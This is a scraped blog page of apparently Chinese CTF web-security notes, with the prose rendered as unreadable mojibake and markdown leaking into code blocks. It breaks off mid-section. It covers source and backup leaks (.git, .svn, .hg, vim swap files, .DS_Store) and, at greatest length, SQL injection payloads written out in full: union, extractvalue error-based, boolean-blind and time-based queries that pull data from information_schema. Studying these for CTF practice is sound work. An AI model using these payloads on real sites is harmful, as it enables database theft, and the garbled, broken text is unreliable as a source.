id="phpinfo">phpinfo</span></h4><p>phpinfo()æ˜¯phpä¸­æŸ¥çœ‹ç›¸å…³ä¿¡æ¯çš„å‡½æ•°ï¼Œå½“åœ¨é¡µé¢ä¸­æ‰§è¡Œ<code>phpinfo()</code>å‡½æ•°æ—¶ï¼Œphpä¼šå°†è‡ªèº«çš„æ‰€æœ‰ä¿¡æ¯å…¨éƒ¨æ‰“å°å‡ºæ¥ã€‚åœ¨<code>phpinfo</code>ä¸­ä¼šæ³„éœ²å¾ˆå¤šæœåŠ¡ç«¯çš„ä¸€äº›ä¿¡æ¯</p><ul><li>æ€è·¯ï¼šflagæš´éœ²åœ¨phpinfoä¸­</li></ul><h4><span id="hgæ³„éœ²">hgæ³„éœ²</span></h4><ul><li>æ€è·¯ï¼šä½¿ç”¨dirsearchå‘ç°æœ‰.hgæ–‡ä»¶å¤¹ï¼Œä½¿ç”¨dvcs-ripperä¸‹è½½ç›®å½•ï¼Œä½†æ˜¯å·¥å…·æ²¡æœ‰å°†æ‰€æœ‰æ–‡ä»¶ä¸‹ä¸‹æ¥ï¼Œä½¿ç”¨<code>tree</code>å‘½ä»¤æ¥æŸ¥çœ‹ç›®å½•ï¼Œåˆ†æå‘ç°txtæ–‡ä»¶ä¸­æœ‰<code>add flag</code>ï¼Œä½¿ç”¨<code>grep -a -r flag</code>æŸ¥çœ‹flagå­˜åœ¨çš„æ–‡ä»¶åï¼Œé€šè¿‡curlæ¥æŸ¥çœ‹æ–‡ä»¶ã€‚</li></ul><h4><span id="svnæ³„éœ²">SVNæ³„éœ²</span></h4><ul><li>æ€è·¯ï¼šä½¿ç”¨dirsearchå‘ç°æœ‰.svnæ–‡ä»¶å¤¹ï¼Œä½¿ç”¨dvcs-ripperä¸‹è½½ç›®å½•ï¼Œä» wc.db ä¸­æ‰¾åˆ° flag çš„æ–‡ä»¶çš„æ–‡ä»¶å, å°è¯•è®¿é—®ç»“æœå‘ç°è¢«åˆ é™¤äº†ã€‚æŸ¥çœ‹<code>.svn/pristine/</code>ä¸­çš„æ–‡ä»¶ï¼Œæ‰¾åˆ°flag</li></ul><h4><span id="gitæ³„éœ²">Gitæ³„éœ²</span></h4><ul><li>æ€è·¯ï¼šä½¿ç”¨dirsearchå‘ç°æœ‰.gitæ–‡ä»¶å¤¹ï¼Œä½¿ç”¨githackå·¥å…·å°†ç½‘ç«™é‡Œçš„.gitæ–‡ä»¶å¤¹ä¸‹è½½åˆ°æœ¬åœ°</li></ul><h5><span id="log">log</span></h5><p>ç½‘ç«™ä¸‹å¯èƒ½æœ‰.gitæ–‡ä»¶</p><ul><li>æ€è·¯ï¼šæˆ‘ä»¬é€šè¿‡<code>git log</code>æŸ¥çœ‹æäº¤æ—¥å¿—ï¼Œç„¶åç”¨è¿‡<code>git diff</code>æ¥å¯¹æ¯”ç‰ˆæœ¬åŒºåˆ«æ‰¾åˆ°flag</li></ul><h5><span id="stash">Stash</span></h5><p>gitå¯èƒ½æœ‰çš„æ–‡ä»¶æ”¾åˆ°stashæš‚å­˜</p><ul><li>æ€è·¯ï¼šé€šè¿‡<code>git stash list</code>æŸ¥çœ‹ï¼Œæ‰§è¡Œ git stash pop å‘ç°ä» git æ ˆä¸­å¼¹å‡ºæ¥ä¸€ä¸ªæ–‡ä»¶ï¼Œè¿™ä¸ªæ–‡ä»¶çš„å†…å®¹å°±æ˜¯ flag</li></ul><h5><span id="index">index</span></h5><p>ä½¿ç”¨<code>git ls-file --stage</code>æŸ¥çœ‹index fileæ–‡ä»¶ï¼Œä½¿ç”¨<code>git log</code>å‘½ä»¤æŸ¥çœ‹å†å²è®°å½•ï¼Œé€šè¿‡<code>git diff</code>å¯¹æ¯”æäº¤ç‰ˆæœ¬ã€‚</p><h4><span id="å¤‡ä»½æ–‡ä»¶ä¸‹è½½">å¤‡ä»½æ–‡ä»¶ä¸‹è½½</span></h4><h5><span id="ç½‘ç«™æºç ">ç½‘ç«™æºç </span></h5><ul><li>æ€è·¯ï¼šç½‘ç«™æºç å¯èƒ½æ”¾åœ¨ç›®å½•é‡Œé¢ï¼Œæ‰“å¼€å³å¯è·å–flag</li></ul><h5><span id="bakæ–‡ä»¶">bakæ–‡ä»¶</span></h5><p>æœ‰äº›æ—¶å€™ç½‘ç«™ç®¡ç†å‘˜å¯èƒ½ä¸ºäº†æ–¹ä¾¿ï¼Œä¼šåœ¨ä¿®æ”¹æŸä¸ªæ–‡ä»¶çš„æ—¶å€™å…ˆå¤åˆ¶ä¸€ä»½ï¼Œå°†å…¶å‘½åä¸ºxxx.bak</p><ul><li>æ€è·¯ï¼šç›´æ¥ä½¿ç”¨curl + url å³å¯è®¿é—®</li></ul><h5><span id="vimç¼“å­˜">vimç¼“å­˜</span></h5><p>åœ¨ä½¿ç”¨vimæ—¶ä¼šåˆ›å»ºä¸´æ—¶ç¼“å­˜æ–‡ä»¶ï¼Œå…³é—­vimæ—¶ç¼“å­˜æ–‡ä»¶åˆ™ä¼šè¢«åˆ é™¤ï¼Œå½“vimå¼‚å¸¸é€€å‡ºåï¼Œå› ä¸ºæœªå¤„ç†ç¼“å­˜æ–‡ä»¶ï¼Œå¯¼è‡´å¯ä»¥é€šè¿‡ç¼“å­˜æ–‡ä»¶æ¢å¤åŸå§‹æ–‡ä»¶å†…å®¹  </p><p>ä»¥index.phpä¸ºä¾‹ï¼šç¬¬ä¸€æ¬¡äº§ç”Ÿçš„äº¤æ¢æ–‡ä»¶åä¸º<code>.index.php.swp</code>ï¼Œå†æ¬¡æ„å¤–é€€å‡ºåä¼šäº§ç”Ÿåä¸º <code>.index.php.swo</code>çš„äº¤æ¢æ–‡ä»¶ï¼Œç¬¬ä¸‰æ¬¡äº§ç”Ÿçš„äº¤æ¢æ–‡ä»¶åˆ™ä¸º <code>.index.php.swn</code></p><ul><li>æ€è·¯ï¼šä½¿ç”¨curlè®¿é—®ï¼Œæˆ–è€…ä½¿ç”¨wgetä¸‹è½½åˆ°æœ¬åœ°å†æŸ¥çœ‹</li></ul><h5><span id="ds_store">DS_Store</span></h5><figure class="highlight plaintext"><figcaption><span>æ˜¯ Mac OS ä¿å­˜æ–‡ä»¶å¤¹çš„è‡ªå®šä¹‰å±æ€§çš„éšè—æ–‡ä»¶ã€‚é€šè¿‡```.DS_Store```å¯ä»¥çŸ¥é“è¿™ä¸ªç›®å½•é‡Œé¢æ‰€æœ‰æ–‡ä»¶çš„æ¸…å•ã€‚</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- æ€è·¯ï¼šä½¿ç”¨curlå‘½ä»¤è®¿é—®```.DS_Store``` æ–‡ä»¶å³å¯</span><br><span class="line"></span><br><span class="line">### å¯†ç å£ä»¤</span><br><span class="line"></span><br><span class="line">#### å¼±å£ä»¤</span><br><span class="line"></span><br><span class="line">- æ€è·¯ï¼šçœ‹åˆ°ç®¡ç†ç³»ç»Ÿé»˜è®¤è´¦å·ä¸ºadminï¼Œå¯†ç å…ˆå°è¯•ç”¨å¼±å£ä»¤å¯†ç æœ¬æ”»å‡»ï¼Œå‘ç°æ— æ•ˆ</span><br><span class="line"></span><br><span class="line">#### é»˜è®¤å£ä»¤</span><br><span class="line"></span><br><span class="line">- æ€è·¯ï¼šé ç¤¾ä¼šå·¥ç¨‹çš„æ£€ç´¢èƒ½åŠ›</span><br><span class="line"></span><br><span class="line">### SQLæ³¨å…¥</span><br><span class="line"></span><br><span class="line">#### æ•´æ•°å‹</span><br><span class="line"></span><br><span class="line">æ£€æŸ¥æ˜¯å¦å­˜åœ¨æ³¨å…¥</span><br><span class="line"></span><br><span class="line">```sql</span><br><span class="line">xx = ? and 1=1 # è¿”å›æ­£ç¡®</span><br><span class="line">xx = ? and 1=2 # è¿”å›é”™è¯¯</span><br></pre></td></tr></table></figure><p>çŒœå­—æ®µæ•°ï¼ˆxä¸ºæ•°å­—ï¼‰ å¾—å‡ºå­—æ®µæ•°</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xx <span class="operator">=</span> ? <span class="keyword">order</span> <span class="keyword">by</span> x</span><br></pre></td></tr></table></figure><p>çˆ†æ•°æ®åº“å</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xx <span class="operator">=</span> ? <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,database()</span><br></pre></td></tr></table></figure><p>çˆ†è¡¨å</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xx <span class="operator">=</span> ? <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,...,group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;æ•°æ®åº“å&#x27;</span> </span><br></pre></td></tr></table></figure><p>çˆ†åˆ—å</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xx <span class="operator">=</span> ? <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,...,group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;flag&#x27;</span> </span><br></pre></td></tr></table></figure><p>è·å¾—flag</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xx <span class="operator">=</span> ? <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,...,group_concat(flag) <span class="keyword">from</span> flag.flag</span><br></pre></td></tr></table></figure><p>å…¶ä¸­â€¦ çš„æ•°é‡ä¸º<code>order by x</code>ä¸­çš„x</p><h4><span id="å­—ç¬¦å‹">å­—ç¬¦å‹</span></h4><p>å­—ç¬¦å‹æ³¨å…¥è¦è€ƒè™‘åˆ°  å¼•å·é—­åˆ  å’Œ  æ³¨é‡Š </p><p>åˆ¤æ–­æ³¨å…¥</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and 1=1 # è¿”å›æ­£ç¡®</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> # è¿”å›é”™è¯¯</span><br></pre></td></tr></table></figure><p>çŒœå­—æ®µ</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; order by 2 # è¿”å›æ­£ç¡®</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">3</span> # è¿”å›é”™è¯¯</span><br></pre></td></tr></table></figure><p>çˆ†æ•°æ®åº“å</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and 1=2 union select 1,database()</span></span><br></pre></td></tr></table></figure><p>çˆ†è¡¨å</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and 1=2 union select 1,group_concat(table_name)from information_schema.tables where table_schema=&#x27;</span>sqli<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p>çˆ†åˆ—å</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and 1=2 union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>flag<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p>çˆ†å­—æ®µå†…å®¹ï¼ˆflagï¼‰</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and 1=2 union select 1,group_concat(flag) from sqli.flag</span></span><br></pre></td></tr></table></figure><h4><span id="æŠ¥é”™æ³¨å…¥">æŠ¥é”™æ³¨å…¥</span></h4><figure class="highlight plaintext"><figcaption><span>:å¯¹[XML](https://so.csdn.net/so/search?q</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">```extractvalue(ç›®æ ‡xmlæ–‡æ¡£ï¼Œxmlè·¯å¾„)```</span><br><span class="line"></span><br><span class="line">&gt; ç¬¬ä¸€ä¸ªå‚æ•° : ç¬¬ä¸€ä¸ªå‚æ•°å¯ä»¥ä¼ å…¥ç›®æ ‡xmlæ–‡æ¡£</span><br><span class="line">&gt;</span><br><span class="line">&gt; ç¬¬äºŒä¸ªå‚æ•°ï¼š xmlä¸­çš„ä½ç½®æ˜¯å¯æ“ä½œçš„åœ°æ–¹ï¼Œxmlæ–‡æ¡£ä¸­æŸ¥æ‰¾å­—ç¬¦ä½ç½®æ˜¯ç”¨ /xxx/xxx/xxx/â€¦è¿™ç§æ ¼å¼ï¼Œå¦‚æœæˆ‘ä»¬å†™å…¥å…¶ä»–æ ¼å¼ï¼Œå°±ä¼šæŠ¥é”™ï¼Œå¹¶ä¸”ä¼šè¿”å›æˆ‘ä»¬å†™å…¥çš„éæ³•æ ¼å¼å†…å®¹ï¼Œè€Œè¿™ä¸ªéæ³•çš„å†…å®¹å°±æ˜¯æˆ‘ä»¬æƒ³è¦æŸ¥è¯¢çš„å†…å®¹ã€‚</span><br><span class="line">&gt;</span><br><span class="line">&gt; å¯ä»¥ç”¨ 0x5c  (â€˜\)ï¼Œè¿˜å¯ä»¥ä½¿ç”¨0x7e (~)ï¼Œä½¿å¾—sqléæ³•</span><br><span class="line"></span><br><span class="line">æŸ¥è¯¢æ•°æ®åº“</span><br><span class="line"></span><br><span class="line">```sql</span><br><span class="line">?id=1 and extractvalue(1,concat(0x7e,database(),0x7e))</span><br></pre></td></tr></table></figure><p>çˆ†è¡¨å</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database()),<span class="number">0x7e</span>))</span><br></pre></td></tr></table></figure><p>çˆ†åˆ—å</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;flag&#x27;</span>),<span class="number">0x7e</span>))</span><br></pre></td></tr></table></figure><p>çˆ†æ•°æ®</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> flag <span class="keyword">from</span> flag),<span class="number">0x7e</span>))</span><br></pre></td></tr></table></figure><p><strong>midå‡½æ•°</strong></p><blockquote><p>MID()å‡½æ•°ç”¨äºä»æ–‡æœ¬å­—æ®µä¸­æå–å­—ç¬¦ã€‚ SELECT MID(column_name,start[,length]) FROM table_name;</p></blockquote><table><thead><tr><th>å‚æ•°</th><th>æè¿°</th></tr></thead><tbody><tr><td>column_name</td><td>å¿…éœ€ã€‚è¦æå–å­—ç¬¦çš„å­—æ®µã€‚</td></tr><tr><td>start</td><td>å¿…éœ€ã€‚è§„å®šå¼€å§‹ä½ç½®ï¼ˆèµ·å§‹å€¼æ˜¯ 1ï¼‰ã€‚</td></tr><tr><td>length</td><td>å¯é€‰ã€‚è¦è¿”å›çš„å­—ç¬¦æ•°ã€‚å¦‚æœçœç•¥ï¼Œåˆ™ MID() å‡½æ•°è¿”å›å‰©ä½™æ–‡æœ¬ã€‚</td></tr></tbody></table><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,mid((<span class="keyword">select</span> flag <span class="keyword">from</span> flag),<span class="number">1</span>,<span class="number">16</span>),<span class="number">0x7e</span>))</span><br><span class="line"></span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,mid((<span class="keyword">select</span> flag <span class="keyword">from</span> flag),<span class="number">17</span>),<span class="number">0x7e</span>))</span><br><span class="line"># æ‹¼æ¥å¾—åˆ°flag</span><br></pre></td></tr></table></figure><h4><span id="å¸ƒå°”æ³¨å…¥">å¸ƒå°”æ³¨å…¥</span></h4><p>åªä¼šè¿”å›æ­£ç¡®æˆ–è€…é”™è¯¯ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦æ„é€ <code>if</code>è¯­å¥è¿›è¡Œæ³¨å…¥ï¼Œæ‰‹åŠ¨è¿‡ç¨‹ä¾›å‚è€ƒï¼Œè¿˜æ˜¯ç”¨sqlmapé è°±ã€‚</p><ul><li>å…ˆçŒœæµ‹æ•°æ®åº“é•¿åº¦</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> (length(database()))<span class="operator">&gt;</span><span class="number">5</span> # ç»“æœæ˜¯error</span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> (length(database()))<span class="operator">=</span><span class="number">4</span> # ç»“æœæ˜¯success</span><br></pre></td></tr></table></figure><ul><li>çŒœæµ‹æ•°æ®åº“å</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">110</span> # å¯ä»¥äºŒåˆ†æ³•æ¥ç¡®è®¤æ¯ä¸ªå­—æ¯ </span><br></pre></td></tr></table></figure><ul><li>å¾—åˆ°æ•°æ®åº“è¡¨ä¸­æ•°é‡</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="built_in">count</span>(table_name) <span class="keyword">from</span> information_schema.tables</span><br><span class="line"> <span class="keyword">where</span> table_schema<span class="operator">=</span>database())<span class="operator">=</span><span class="number">2</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>å¾—åˆ°è¡¨å</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables</span><br><span class="line"> <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">110</span></span><br><span class="line"># (ä¸æ–­æ”¹å˜èŒƒå›´ï¼ŒæŠŠç¬¬ä¸€å¼ æ•°æ®è¡¨çš„ç¬¬ä¸€ä¸ªå­—æ¯çŒœè§£å‡ºæ¥)</span><br><span class="line"></span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables</span><br><span class="line"> <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">2</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">110</span></span><br><span class="line"># (ä¸æ–­æ”¹å˜èŒƒå›´ï¼ŒæŠŠç¬¬ä¸€å¼ æ•°æ®è¡¨çš„ç¬¬äºŒä¸ªå­—æ¯çŒœè§£å‡ºæ¥)</span><br><span class="line"></span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables</span><br><span class="line"> <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">3</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">110</span></span><br><span class="line"># (ä¸æ–­æ”¹å˜èŒƒå›´ï¼ŒæŠŠç¬¬ä¸€å¼ æ•°æ®è¡¨çš„ç¬¬ä¸‰ä¸ªå­—æ¯çŒœè§£å‡ºæ¥)</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line"># æœ€åå¾—åˆ°è¡¨åä¸ºnews</span><br><span class="line"></span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables</span><br><span class="line"> <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">1</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">110</span></span><br><span class="line"># (ä¸æ–­æ”¹å˜èŒƒå›´ï¼ŒæŠŠç¬¬äºŒå¼ æ•°æ®è¡¨çš„ç¬¬ä¸€ä¸ªå­—æ¯çŒœè§£å‡ºæ¥)</span><br><span class="line"></span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables</span><br><span class="line"> <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">1</span>,<span class="number">1</span>),<span class="number">2</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">110</span></span><br><span class="line"># (ä¸æ–­æ”¹å˜èŒƒå›´ï¼ŒæŠŠç¬¬äºŒå¼ æ•°æ®è¡¨çš„ç¬¬äºŒä¸ªå­—æ¯çŒœè§£å‡ºæ¥)</span><br><span class="line"></span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables</span><br><span class="line"> <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">1</span>,<span class="number">1</span>),<span class="number">3</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">110</span></span><br><span class="line"># (ä¸æ–­æ”¹å˜èŒƒå›´ï¼ŒæŠŠç¬¬äºŒå¼ æ•°æ®è¡¨çš„ç¬¬ä¸‰ä¸ªå­—æ¯çŒœè§£å‡ºæ¥)</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line"># æœ€åå¾—åˆ°è¡¨åä¸ºflag</span><br></pre></td></tr></table></figure><ul><li>çŒœæµ‹flagè¡¨çš„å­—æ®µæ•°</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="built_in">count</span>(column_name) <span class="keyword">from</span> information_schema.columns</span><br><span class="line"> <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;flag&#x27;</span>)<span class="operator">=</span><span class="number">1</span></span><br><span class="line"></span><br><span class="line"># å¾—åˆ°flagåªæœ‰ä¸€ä¸ªå­—æ®µ</span><br></pre></td></tr></table></figure><ul><li>çŒœæµ‹å­—æ®µå</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns</span><br><span class="line"> <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;flag&#x27;</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">110</span></span><br><span class="line">#(ä¸æ–­æ”¹å˜èŒƒå›´ï¼ŒæŠŠå­—æ®µåçŒœè§£å‡ºæ¥)</span><br><span class="line">#......</span><br><span class="line">#å¾—åˆ°å­—æ®µåä¹Ÿä¸ºflag</span><br></pre></td></tr></table></figure><ul><li>çŒœæµ‹flag</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> sqli.flag <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">110</span></span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> sqli.flag <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span>),<span class="number">2</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">110</span></span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> sqli.flag <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span>),<span class="number">3</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">110</span></span><br><span class="line"></span><br><span class="line">#......</span><br><span class="line">#è¿™æ˜¯ä¸€ä¸ªå·¨å¤§çš„å·¥ä½œé‡ï¼Œæ‰€ä»¥åº”è¯¥ç§¯ç´¯åˆ°çš„ä¸€ä¸ªç»éªŒæ˜¯ï¼š</span><br><span class="line">#æ‰‹å·¥ç›²æ³¨ç‰¹åˆ«ç¹çï¼Œç¢°åˆ°è¿™ç±»é¢˜ç›®è¦ä¼šç”¨å·¥å…·sqlmap</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4><span id="mysqlç»“æ„">MySQLç»“æ„</span></h4><h4><span id="æ—¶é—´ç›²æ³¨">æ—¶é—´ç›²æ³¨</span></h4><p>åŸç†å’Œå¸ƒå°”ç›²æ³¨å·®ä¸å¤šï¼Œé€šè¿‡è¿”å›æ—¶é—´æ¥åˆ¤æ–­</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>((substr(database(),<span class="number">1</span>,<span class="number">1</span>)=&#x27;s&#x27;),sleep(<span class="number">1</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h4><span id="cookieæ³¨å…¥">cookieæ³¨å…¥</span></h4><p>é¦–å…ˆé€šè¿‡æŠ“åŒ…ï¼Œå‘ç°æµè§ˆå™¨è¿”å›cookie: id&#x3D;1</p><p>ä½¿ç”¨postmanè¿›è¡Œå‘åŒ…å¤„ç†</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">3</span> # <span class="number">1</span>å’Œ<span 